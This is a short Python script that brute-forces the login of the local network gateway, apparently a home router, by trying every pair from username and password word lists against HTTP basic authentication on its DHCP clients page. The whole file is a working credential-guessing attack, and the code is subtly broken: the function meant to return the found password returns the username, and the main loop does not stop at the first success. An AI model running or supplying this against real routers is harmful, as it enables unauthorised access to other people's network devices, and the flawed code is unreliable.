import requests
from check_local import get_gateway

router = get_gateway()
logging = False

def read_usernames_from_file(file_name):
    with open(file_name, 'r') as file:
        items = [line.strip() for line in file]
    return items

usernames = read_usernames_from_file('usernames.txt')
passwords = read_usernames_from_file('passwords.txt')

def login(router_ip, username, password):
    url = f"http://{router_ip}/dhcpclients.htm"
    response = requests.get(url, auth=(username, password))
    if response.status_code == 200:
        return True
    else:
        return False

def main():
    global logging, router
    for username in usernames:
        for password in passwords:
            if login(router, username, password):
                logging = True
                break  

def _username():
    for username in usernames:
        for password in passwords:
            if login(router, username, password):
                return username


def _password():
    for username in usernames:
        for password in passwords:
            if login(router, username, password):
                return username

if __name__ == "__main__":
    main()
    if logging == True:
        print("Logging Successful")
    else:
        print("Logging Failed")
